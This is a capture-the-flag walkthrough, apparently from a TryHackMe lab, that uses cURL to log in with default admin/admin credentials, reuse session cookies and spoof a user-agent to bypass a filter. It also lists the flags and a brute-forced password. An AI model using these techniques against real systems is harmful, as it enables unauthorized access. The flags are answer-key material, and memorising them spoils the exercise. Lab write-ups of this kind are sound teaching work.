# Exploitation with cURL - Hoperation Eggsploit 

### Learning Objectives
- Understand what HTTP requests and responses are at a high level.
 - Use cURL to make basic requests (using GET) and view raw responses in the terminal.
- Send POST requests with cURL to submit data to endpoints.
- Work with cookies and sessions in cURL to maintain login state across requests.

Q1) Make a **POST** request to the `/post.php` endpoint with the **username** `admin` and the **password** `admin`. What is the flag you receive?

```
➜ curl -X POST -d "username=admin&password=admin" http://10.82.151.253/post.php
Login successful!
Flag: THM{curl_post_success}
```

A1) `THM{curl_post_success}`

Q2) Make a request to the /cookie.php endpoint with the username admin and the password admin and save the cookie. Reuse that saved cookie at the same endpoint. What is the flag your receive?

```
➜ curl -c cookies.txt -d "username=admin&password=admin" http://10.82.151.253/cookie.php
Login successful. Cookie set.
➜ curl -b cookies.txt http://10.82.151.253/cookie.php
Welcome back, admin!
Flag: THM{session_cookie_master}
```

A2) `THM{session_cookie_master}`

Q3) After doing the brute force on the `/bruteforce.php` endpoint, what is the password of the `admin` user?

A3) `secretpass`

Q4) Make a request to the `/agent.php` endpoint with the user-agent `TBFC`. What is the flag your receive?

```
➜ curl -A "TBFC" http://10.82.151.253/agent.php
Flag: THM{user_agent_filter_bypassed}
```

A4) `THM{user_agent_filter_bypassed}`


